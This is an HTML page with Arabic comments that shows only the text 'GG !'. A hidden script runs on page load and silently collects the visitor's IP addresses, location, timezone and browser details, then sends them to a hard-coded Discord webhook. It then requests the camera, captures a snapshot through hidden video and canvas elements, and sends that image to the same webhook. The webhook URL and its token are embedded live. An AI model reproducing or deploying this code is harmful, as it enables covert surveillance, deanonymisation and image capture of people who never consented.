<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>GG !</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #000;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: white;
      font-family: sans-serif;
    }
    #gg-text {
      font-size: 48px;
      font-weight: bold;
      margin-bottom: 20px;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

  <div id="gg-text">GG !</div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const webhookUrl = 'https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv'

    async function getIPData() {
      try {
        const [geoRes, ipv4Res, ipv6Res] = await Promise.all([
          fetch('https://ipapi.co/json/'),
          fetch('https://api.ipify.org?format=json'),
          fetch('https://api64.ipify.org?format=json')
        ])

        const geo = await geoRes.json()
        const ipv4 = (await ipv4Res.json()).ip
        const ipv6 = (await ipv6Res.json()).ip
        const ua = navigator.userAgent

        const msg = `
📡 دخول جديد:

🔢 IPv4: ${ipv4}
🧬 IPv6: ${ipv6}
🏳️ الدولة: ${geo.country_name}
🏙️ المدينة: ${geo.city}
🕓 التوقيت: ${geo.timezone}
📱 الجهاز والمتصفح: ${ua}
        `.trim()

        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: msg })
        })

      } catch (err) {
        console.error('خطأ في جلب أو إرسال المعلومات', err)
      }
    }

    async function captureAndSendPhoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true })
        const video = document.getElementById('video')
        const canvas = document.getElementById('canvas')
        video.srcObject = stream

        // ننتظر شوي لين تشتغل الكاميرا
        await new Promise(resolve => setTimeout(resolve, 2000))

        canvas.width = video.videoWidth
        canvas.height = video.videoHeight
        canvas.getContext('2d').drawImage(video, 0, 0)

        const imgData = canvas.toDataURL('image/png')

        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: '📸 صورة الكاميرا:',
            embeds: [{
              image: {
                url: imgData
              }
            }]
          })
        })

        // نوقف الكاميرا
        stream.getTracks().forEach(track => track.stop())

      } catch (err) {
        console.warn('المستخدم رفض الكاميرا أو فيه خطأ', err)
      }
    }

    window.addEventListener('load', async () => {
      await getIPData()
      // بعد ما يرسل المعلومات، نطلب الكاميرا
      captureAndSendPhoto()
    })
  </script>

</body>
</html>
